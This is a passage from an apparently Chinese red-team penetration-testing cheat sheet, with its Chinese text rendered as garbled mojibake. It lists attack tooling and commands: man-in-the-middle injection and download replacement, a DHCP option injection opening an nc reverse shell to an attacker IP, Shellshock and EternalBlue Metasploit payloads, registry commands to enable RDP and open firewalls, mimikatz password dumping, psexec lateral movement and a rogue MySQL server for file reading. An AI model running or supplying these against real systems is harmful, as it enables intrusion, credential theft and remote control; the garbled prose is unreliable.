6. [OpenRASP WEBDIR+æ£€æµ‹å¼•æ“](https://scanner.baidu.com)

---

# 6RedTeam
## LAN
### ä¸­é—´äºº
**å·¥å…·**
- [LionSec/xerosploit](https://github.com/LionSec/xerosploit)
    - **æ–‡ç« **
        - [xerosploitç”¨æ³•](http://www.cnbreak.org/anquan/461.html)

    - **å®‰è£…**
        ```bash
        git clone https://github.com/LionSec/xerosploit
        cd xerosploit && sudo python install.py
        1
        ./xerosploit
        ```

    - **åŸºæœ¬æ“ä½œ**
        ```bash
        scan # æ˜ å°„ä½ çš„ç½‘ç»œ
        iface # æ‰‹åŠ¨è®¾ç½®ç½‘ç»œæ¥å£
        gateway # æ‰‹åŠ¨è®¾ç½®ç½‘å…³
        rmlog # åˆ é™¤æ‰€æœ‰æ—¥å¿—
        ```

    - **æ¨¡å—æ¼”ç¤º(éƒ¨åˆ†)**
        ```bash
        start
        <é¶æœºIP>
        pscan # ç«¯å£æ‰«æ
        run

        dos # dosæ”»å‡»
        run

        injecthtml # å°† html æ³¨å…¥åˆ°ç›®æ ‡è®¿é—®çš„ç½‘ç«™ä¸­
        run
        /root/test.html

        injectjs # å°† javascript æ³¨å…¥åˆ°ç›®æ ‡ç½‘ç«™ä¸­
        run
        /root/test.js

        rdownload # æ›¿æ¢ç›®æ ‡ä¸‹è½½çš„æ–‡ä»¶
        run
        exe
        /root/test.exe

        sniff # å—…æ¢ç›®æ ‡çš„æµé‡
        run
        ```

- [bettercap/bettercap](https://github.com/bettercap/bettercap)
- [byt3bl33d3r/MITMf](https://github.com/byt3bl33d3r/MITMf)
- [cain](http://www.oxid.it/cain.html)

---

## WAN
### dns
**CVE-1999-0532** dnsåŸŸä¼ é€æ¼æ´
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@æŒ‡å®šåŸŸåæœåŠ¡å™¨ï¼›axfr ä¸ºåŸŸä¼ é€æŒ‡ä»¤ï¼›xxx.edu.cnè¡¨ç¤ºè¦æŸ¥è¯¢çš„åŸŸåï¼›
```

---

## linuxæ¸—é€
### vul
**è¿œç¨‹åˆ©ç”¨ç±»**
- **CVE-2014-6271** Bashè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´â€œç ´å£³â€
    - æ–‡ç« 
        - [Bashè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´â€œç ´å£³â€ï¼ˆCVE-2014-6271ï¼‰åˆ†æ](https://www.antiy.com/response/CVE-2014-6271.html)

    - POC | Payload | exp
        - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)

    - æœ¬åœ°éªŒè¯æ–¹æ³•
    `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`
    æ‰§è¡Œå‘½ä»¤åï¼Œå¦‚æœæ˜¾ç¤ºVulnerable CVE-2014-6271ï¼Œè¯ç³»ç»Ÿå­˜åœ¨æ¼æ´ï¼Œå¯æ”¹å˜echo Vulnerable CVE-2014-6271ä¸ºä»»æ„å‘½ä»¤è¿›è¡Œæ‰§è¡Œã€‚

    - MSFæ¨¡å—
        ```bash
        use exploit/linux/http/ipfire_bashbug_exec
        use exploit/multi/http/cups_bash_env_exec
        use exploit/unix/dhcp/bash_environment
        ```

- **CVE-2018-1111** DHCP å®¢æˆ·ç«¯è„šæœ¬ä»£ç æ‰§è¡Œæ¼æ´
    - æ–‡ç« 
        - [CVE-2018-1111å¤ç°ç¯å¢ƒæ­å»ºä¸dhcpå‘½ä»¤æ³¨å…¥](https://www.freebuf.com/articles/web/191884.html)
        - [DHCPå®¢æˆ·ç«¯è„šæœ¬ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)

    - POC | Payload | exp
        - [ knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
        - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)

    - æœ¬åœ°åˆ©ç”¨æ–¹æ³•
        ```
        attacker: kali linux 2018 x64 192.168.71.5
        victim: Centos 7 x64 192.168.71.10
        ```
        ```vim
        vim dnsmasq.conf

        bind-interfaces

        interface=eth0
        except-interface=lo
        dhcp-range=192.168.71.10,192.168.71.20,12h
        dhcp-option=3,192.168.71.5
        dhcp-option=6,192.168.71.5
        log-queries
        log-facility=/var/log/dnsmasq.log
        ```
        `dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash 192.168.71.5 6666 #"`
        `nc -l -p 6666 -v`
        é‡å¯ CentOS çš„ç½‘ç»œæœåŠ¡ï¼Œç„¶å shell å°±åå¼¹å›æ¥äº†

---

## windowsæ¸—é€
### Exchange
- [APT34 Exchangeçˆ†ç ´å·¥å…·](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)

### RDP
**cmdå¼€RDP**
- æ–‡ç« 
    - [å¼€å¯RDP](http://b404.xyz/2017/12/27/open-RDP/)

- å‘½ä»¤
    - **doså‘½ä»¤å¼€å¯3389ç«¯å£ï¼ˆå¼€å¯XP&2003ç»ˆç«¯æœåŠ¡ï¼‰**
        1. æ–¹æ³•ä¸€ï¼š`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
        2. æ–¹æ³•äºŒï¼š`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMICå¼€å¯3389**
        `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShellå¼€å¯RDP**
        1. Enable RDP
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall
        `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        æˆ–

        1. Enable Remote Desktop
        `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule
        `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **æŸ¥çœ‹3389ç«¯å£æ˜¯å¦å¼€å¯**
        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*å¦‚æœæ˜¯0x0åˆ™å¼€å¯`

    - **æ›´æ”¹ç»ˆç«¯ç«¯å£ä¸º2008(åå…­è¿›åˆ¶ä¸ºï¼š0x7d8)**
        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **æŸ¥çœ‹3389ç«¯å£æ˜¯å¦æ›´æ”¹**
        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*å‡ºæ¥çš„ç»“æœæ˜¯16è¿›åˆ¶`

    - **å–æ¶ˆxp&2003ç³»ç»Ÿé˜²ç«å¢™å¯¹ç»ˆç«¯æœåŠ¡çš„é™åˆ¶åŠIPè¿æ¥çš„é™åˆ¶ï¼š**
        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**ç¬¬ä¸‰æ–¹è¿æ¥å·¥å…·**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)

**å¤šå¼€**
- æ–‡ç« 
    - [Win7åŒå¼€3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [æ¸—é€æŠ€å·§â€”â€”Windowsç³»ç»Ÿè¿œç¨‹æ¡Œé¢çš„å¤šç”¨æˆ·ç™»å½•](http://www.4hou.com/system/8314.html)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- å·¥å…·
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

**è¿æ¥è®°å½•**
- æ–‡ç« 
    - [æ¸—é€æŠ€å·§â€”â€”è·å¾—Windowsç³»ç»Ÿçš„è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [å…³äºwindowsçš„RDPè¿æ¥è®°å½•](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- å·¥å…·
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

### vul
**æ¼æ´æŸ¥è¯¢**
- **æ–‡ç« **
    - [windowsæœ¬åœ°ææƒå¯¹ç…§è¡¨](http://www.7kb.org/138.html)

- **æ–‡ä»¶**
    - [BulletinSearch-å¾®è½¯å®˜ç½‘æä¾›çš„æ¼æ´excelåˆ—è¡¨](http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx)

- **å·¥å…·**
    - [GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - æ­¤å·¥å…·å°†ç›®æ ‡ä¿®è¡¥ç¨‹åºçº§åˆ«ä¸Microsoftæ¼æ´æ•°æ®åº“è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ä¾¿æ£€æµ‹ç›®æ ‡ä¸Šå¯èƒ½ç¼ºå°‘çš„ä¿®è¡¥ç¨‹åºã€‚
    - [bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester
    - [tengzhangchao/microsoftSpider](https://github.com/tengzhangchao/microsoftSpider) - çˆ¬å–å¾®è½¯æ¼æ´ä¿¡æ¯ï¼ŒMSå¯¹åº”çš„æ¯ä¸ªç‰ˆæœ¬æ“ä½œç³»ç»ŸKBå·ä»¥åŠè¡¥ä¸ä¸‹è½½åœ°å€ã€‚

- **å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„exp**
    å¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯,ä»¥å…å½±å“ä¸šåŠ¡ã€‚
    å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š
    `systeminfo>micropoor.txt&(forÂ %iÂ inÂ (KB977165Â KB2160329Â KB2503665Â KB2592799 KB2707511Â KB2829361Â KB2850851Â KB3000061Â KB3045171Â KB3077657Â KB3079904 KB3134228Â KB3143141Â KB3141780)Â doÂ @typeÂ micropoor.txt|@findÂ /iÂ Â "%i"||Â @echo %iÂ youÂ canÂ fuck)&delÂ /fÂ /qÂ /aÂ micropoor.txt`

    æ³¨ï¼šä»¥ä¸Šéœ€è¦åœ¨å¯å†™ç›®å½•æ‰§è¡Œã€‚éœ€è¦ä¸´æ—¶ç”Ÿæˆ micrpoor.txt,ä»¥ä¸Šè¡¥ä¸ç¼–å·è¯·æ ¹æ®ç¯å¢ƒæ¥å¢ã€åˆ ã€‚
    ä¸€èˆ¬å®æˆ˜ä¸­åœ¨ç±»ä¼¼Â tmpç›®å½•ç­‰å¯å†™ç›®å½•ä¸‹æ‰§è¡Œï¼šå¦‚`C:\tmp>`

**æ¼æ´èµ„æº**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windowså¹³å°ææƒæ¼æ´é›†åˆ
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

**æœ¬åœ°ææƒç±»**
- **[SandboxEscaper](https://twitter.com/SandboxE)**
    æš´èºå¥³é»‘å®¢ç³»åˆ—
    - [SandboxEscaper/polarbearrepo](https://github.com/SandboxEscaper/polarbearrepo)-DACLä»»æ„å†™å…¥=>ä½æƒé™ç”¨æˆ·æ›´æ”¹æ–‡ä»¶æƒé™=>æœ¬åœ°ææƒï¼Œå½±å“Windows 10ã€Windows Server 2016ã€Windows Server 2019

**è¿œç¨‹åˆ©ç”¨ç±»**
- **MS08-067 & CVE-2008-4250**
    - MSFæ¨¡å—
        ```bash
        use exploit/windows/smb/ms08_067_netapi
        set payload windows/x64/meterpreter/reverse_tcp
        set target 0
        ```

- **MS12-020 & CVE-2012-0002**
    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/rdp/ms12_020_check
        use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
        ```

- **MS14-066 & CVE-2014-6321**
    - POC | Payload | exp
        - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

- **MS15-034 & CVE-2015-1635**
    - POC | Payload | exp
        - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

    - æ–‡ç« 
        - [MS15-034/CVE-2015-1635 HTTPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
        use auxiliary/dos/http/ms15_034_ulonglongadd
        ```

- **MS17-010**
    - MSFæ¨¡å—
        ```bash
        å‘ç°,æ£€æµ‹
        use auxiliary/scanner/smb/smb_ms17_010

        ä½¿ç”¨payloadè¿ä¸Šå»
        use exploit/windows/smb/ms17_010_eternalblue
        set payload windows/x64/meterpreter/reverse_tcp
        set lhost   # è®¾ä¸€ä¸‹æœ¬æœºåœ°å€
        set rhosts
        run

        msf ä¸‹
        åŠ è½½mimikatzæ¨¡å—
        load mimikatz
        kerberos
        ```

- **bluekeep & CVE-2019-0708**
    - POC | Payload | exp
        - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
        - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
        - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)

---

### å£ä»¤è·å–åŠç ´è§£
**mimikatz**
ææƒ
`privilege::debug`

æŠ“å–å¯†ç 
`sekurlsa::logonpasswords`

æˆ–
```
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //æ‰“å°è¾“å‡ºmimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //è¾“å‡ºåˆ°log.txt
```

---

### åŸŸæ¸—é€
```bash
#å¦‚æœæ²¡æœ‰psexecå·¥å…·è®°å¾—æ‰¾pstoolå·¥å…·åŒ…,ä¼ ä¸€ä¸ªä¸Šå»
psexec \\hostIp -u [username] -p [password] cmd
```

---

## webæ¸—é€
### vul
#### å„ç±»è®ºå›/CMS/æ¡†æ¶
**å·¥å…·**
- [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter)
- [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework)
- [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword)

**phpmyadmin**
- **LOAD DATA INFILE ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´**
    - POC | Payload | exp
        [Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)
        ```vim
        vim rogue_mysql_server.py

        PORT = 3307
        ```
        `python rogue_mysql_server.py`
        æ‰“å¼€ç›®æ ‡phpMyAdminçš„ç™»å½•é¡µé¢ï¼Œåœ°å€è¾“å…¥db:3307ã€ç”¨æˆ·åã€å¯†ç ï¼Œæäº¤ç™»å½•ã€‚
        å›åˆ°dbçš„ç»ˆç«¯ï¼Œå¦‚æœæ–‡ä»¶è¯»å–æˆåŠŸä¼šå°†æ–‡ä»¶å†…å®¹è®°å½•åˆ°mysql.logæ–‡ä»¶ä¸­

- **4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨**
    [phpMyAdmin 4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)
    å¯ä»¥é€šè¿‡è¿™ä¸ªçº¿ä¸Šé¶åœºå®éªŒ,ä¸è¿‡dockeré•œåƒå¯èƒ½æœ‰ç‚¹é—®é¢˜,mysqlè¿›ç¨‹èµ·ä¸èµ·æ¥,æˆ‘çš„è§£å†³æ–¹å¼æ˜¯ç›´æ¥å¸äº†é‡è£…mysql-server,è€Œä¸”ä»–é»˜è®¤çš„aptæºæ— æ³•è®¿é—®,è¿˜è¦æ¢ä¸€ä¸‹aptæº

#### åº”ç”¨ç¨‹åº
##### ç¼–è¾‘å™¨
**æ‰‹å†Œ**
- [ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ](https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/)

**ewebeditor**
- æ–‡ç« 
    - [ewebeditorç¼–è¾‘å™¨æ¼æ´æ€»ç»“](https://www.0dayhack.com/post-426.html)

- å¸¸ç”¨è·¯å¾„
    ```
    Admin_Login.asp ç™»å½•é¡µé¢
    Admin_Default.asp ç®¡ç†é¦–é¡µ
    Admin_Style.asp
    Admin_UploadFile.asp
    Upload.asp
    Admin_ModiPwd.asp
    eWebEditor.asp
    db/ewebeditor.mdb é»˜è®¤æ•°æ®åº“è·¯å¾„
    ewebeditor/login_admin.asp
    eweb/login_admin.asp
    editor/login_admin.asp
    ```

**FCKeditor**
- æ–‡ç« 
    - [Fckeditorä¸Šä¼ æ¼æ´åˆ©ç”¨æ‹¿shellæ€»ç»“](https://www.0dayhack.com/post-413.html)

- å¸¸ç”¨è·¯å¾„
    ```
    FCKeditor/_samples/default.html   æŸ¥çœ‹ç¼–è¾‘å™¨ç‰ˆæœ¬
    FCKeditor/_whatsnew.html
    fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
    FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.test.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php
    FCKeditor/_samples/asp/sample01.asp
    FCKeditor/_samples/asp/sample02.asp
    FCKeditor/_samples/asp/sample03.asp
    FCKeditor/_samples/asp/sample04.asp
    ```

**kindeditor**
- **kindeditor<=4.1.5ä¸Šä¼ æ¼æ´**
    - æ–‡ç« 
        - [kindeditor<=4.1.5ä¸Šä¼ æ¼æ´å¤ç°](https://www.cnblogs.com/backlion/p/10421405.html)

    - æ¼æ´ä¿®å¤
        1. ç›´æ¥åˆ é™¤upload_json.*å’Œfile_manager_json.*
        2. å‡çº§kindeditoråˆ°æœ€æ–°ç‰ˆæœ¬

#### ä¸­é—´ä»¶
**æ–‡ç« **
- [ä¸­é—´ä»¶æ¼æ´åˆé›†](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)

**Apache**
- **CVE-2017-9798** Optionsbleed æœåŠ¡å™¨å†…å­˜ä¿¡æ¯æ³„æ¼æ¼æ´
    - æ–‡ç« 
        - [Optionsbleed æ¼æ´æ³„éœ² Apache Server çš„å†…å­˜ä¿¡æ¯](https://www.freebuf.com/vuls/148525.html)

    - POC | Payload | exp
        - [hannob/optionsbleed](https://github.com/hannob/optionsbleed)

**[Apache Struts](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)**
- **å·¥å…·**
    - [Lucifer1993/struts-scan](https://github.com/Lucifer1993/struts-scan) - Python2 ç¼–å†™çš„struts2æ¼æ´å…¨ç‰ˆæœ¬æ£€æµ‹å’Œåˆ©ç”¨å·¥å…·
    - [HatBoy/Struts2-Scan](https://github.com/HatBoy/Struts2-Scan) - Python3 Struts2å…¨æ¼æ´æ‰«æåˆ©ç”¨å·¥å…·

- **ç¯å¢ƒæ”¶é›†**
    - [wh1t3p1g/Struts2Environment](https://github.com/wh1t3p1g/Struts2Environment)
    - [sie504/Struts-S2-xxx](https://github.com/sie504/Struts-S2-xxx)
    - [https://github.com/shengqi158/S2-055-PoC](https://github.com/shengqi158/S2-055-PoC)

- **æ–‡ç« **
    - [Struts2 å†å² RCE æ¼æ´å›é¡¾ä¸å®Œå…¨ç³»åˆ—](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/)

- **S2-020 & CVE-2014-0094 & CNNVD-201403-191**

- **S2-045 & CVE-2017-5638**
    - POC | Payload | exp
        - [tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
        - [iBearcat/S2-045](https://github.com/iBearcat/S2-045)

- **S2-046 & CVE-2017-5638**
    è¯¥æ¼æ´æ˜¯ç”±äºä¸Šä¼ åŠŸèƒ½çš„å¼‚å¸¸å¤„ç†å‡½æ•°æ²¡æœ‰æ­£ç¡®å¤„ç†ç”¨æˆ·è¾“å…¥çš„é”™è¯¯ä¿¡æ¯ï¼Œå¯¼è‡´è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼ï¼Œæ„é€ å‘é€æ¶æ„çš„æ•°æ®åŒ…ï¼Œåˆ©ç”¨è¯¥æ¼æ´è¿›è€Œåœ¨å—å½±å“æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

    - ä¿®å¤æ–¹æ¡ˆ
        1. å®˜æ–¹å·²ç»å‘å¸ƒç‰ˆæœ¬æ›´æ–°ï¼Œå°½å¿«å‡çº§åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬ï¼ˆStruts 2.3.32æˆ–Struts 2.5.10.1ï¼‰ï¼Œå»ºè®®åœ¨å‡çº§å‰åšå¥½æ•°æ®å¤‡ä»½ã€‚
        2. ä¸´æ—¶ä¿®å¤æ–¹æ¡ˆ
        åœ¨ç”¨æˆ·ä¸ä¾¿è¿›è¡Œå‡çº§çš„æƒ…å†µä¸‹ï¼Œä½œä¸ºä¸´æ—¶çš„è§£å†³æ–¹æ¡ˆï¼Œç”¨æˆ·å¯ä»¥è¿›è¡Œä»¥ä¸‹æ“ä½œæ¥è§„é¿é£é™©ï¼šåœ¨WEB-INF/classesç›®å½•ä¸‹çš„struts.xml ä¸­çš„struts æ ‡ç­¾ä¸‹æ·»åŠ 
        `<constant name="struts.custom.i18n.resources" value="global" />`
        åœ¨WEB-INF/classes/ ç›®å½•ä¸‹æ·»åŠ  global.propertiesï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š
        `struts.messages.upload.error.InvalidContentTypeException=1`

    - POC | Payload | exp
        - [mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)

- **S2-048 & CVE-2017-9791**
    - POC | Payload | exp
        - [dragoneeg/Struts2-048](https://github.com/dragoneeg/Struts2-048)

- **S2-052 & CVE-2017-9805**
    - POC | Payload | exp
        - [mazen160/struts-pwn_CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)

- **S2-053 & CVE-2017-12611**
    - POC | Payload | exp
        - [brianwrf/S2-053-CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)

- **S2-055 & CVE-2017-7525**
    - POC | Payload | exp
        - [iBearcat/S2-055](https://github.com/iBearcat/S2-055)

- **S2-056 & CVE-2018-1327**
    - POC | Payload | exp
        - [ iBearcat/S2-056-XStream](https://github.com/iBearcat/S2-056-XStream)

- **S2-057 & CVE-2018-11776**
    è¯¥æ¼æ´ç”±Semmle Security Research teamçš„å®‰å…¨ç ”ç©¶å‘˜Man YueMoå‘ç°ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨Struts2å¼€å‘æ¡†æ¶ä¸­ä½¿ç”¨namespaceåŠŸèƒ½å®šä¹‰XMLé…ç½®æ—¶ï¼Œnamespaceå€¼æœªè¢«è®¾ç½®ä¸”åœ¨ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆAction Configurationï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

    - POC | Payload | exp
        - [Ivan1ee/struts2-057-exp](https://github.com/Ivan1ee/struts2-057-exp)

**Apache Tomcat**
- **æ–‡ç« **
    - [Tomcatæ¼æ´è¯¦è§£](http://www.mottoin.com/detail/389.html)

- **CVE-2017-12615**
    - æ–‡ç« 
        - [CVE-2017-12615/CVE-2017-12616:Tomcatä¿¡æ¯æ³„æ¼å’Œè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†ææŠ¥å‘Š](https://paper.seebug.org/399/)

    - POC | Payload | exp
        - [iBearcat/CVE-2017-12615](https://github.com/iBearcat/CVE-2017-12615)
        - [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)

- **CVE-2017-12617**
    - æ–‡ç« 
        - [CVE-2017-12617-Tomcatè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°æµ‹è¯•](https://www.freebuf.com/vuls/150203.html)

    - POC | Payload | exp
        - [cyberheartmi9/CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)

    - msfæ¨¡å—
        ```
        use exploit/multi/http/tomcat_jsp_upload_bypass
        ```

- **CVE-2019-0232**
    - æ–‡ç« 
        - [CVE-2019-0232ï¼šApache Tomcat RCEæ¼æ´åˆ†æ](https://xz.aliyun.com/t/4875)

    - POC | Payload | exp
        - [pyn3rd/CVE-2019-0232](https://github.com/pyn3rd/CVE-2019-0232)
        - [jas502n/CVE-2019-0232](https://github.com/jas502n/CVE-2019-0232)

**IIS**
- **IIS shortname**
    windowsåœ¨åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿè¿˜ä¼šç”Ÿæˆ 8.3 æ ¼å¼çš„å…¼å®¹ MS-DOS çš„ï¼ˆçŸ­ï¼‰æ–‡ä»¶åï¼Œä»¥å…è®¸åŸºäº MS-DOS æˆ–16ä½ windows çš„ç¨‹åºè®¿é—®è¿™äº›æ–‡ä»¶ã€‚

    - æ–‡ç« 
        - [IISçŸ­æ–‡ä»¶åæ¼æ´](http://www.lonelyor.org/lonelyorWiki/15446866501207.html)
        - [IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´ä¿®å¤](https://segmentfault.com/a/1190000006225568)
        - [IISçŸ­æ–‡ä»¶/æ–‡ä»¶å¤¹æ¼æ´(æ±‡æ€»æ•´ç†) ](https://www.freebuf.com/articles/4908.html)

    - ä¿®å¤æ–¹æ¡ˆ
        1. å‡çº§ .net framework è‡³ 4.0 ç‰ˆæœ¬æˆ–ä»¥ä¸Š
        2. ä¿®æ”¹HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem ä¿®æ”¹NtfsDisable8dot3NameCreationä¸º1

    - ç¤ºä¾‹
        ```bash
        dir /x
        1. http://www.xxx.com/*~1*/.aspx
        2. http://www.xxx.com/l1j1e*~1*/.aspx
        #è‹¥1è¿”å›404è€Œ2è¿”å›400ï¼Œåˆ™å¯ä»¥åˆ¤æ–­ç›®æ ‡ç«™ç‚¹å­˜åœ¨æ¼æ´ã€‚
        http://www.xxx.com/a*~1*/.aspx
        #è‹¥å­˜åœ¨å°†è¿”å›404ï¼Œä¸å­˜åœ¨åˆ™è¿”å›400ã€‚ä»¥æ­¤ç±»æ¨ï¼Œä¸æ–­å‘ä¸‹çŒœè§£æ‰€æœ‰çš„6ä¸ªå­—ç¬¦ã€‚
        ```

    - POC | Payload | exp
        - [lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
        - [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

- **.Net Framework æ‹’ç»æœåŠ¡æ”»å‡»**
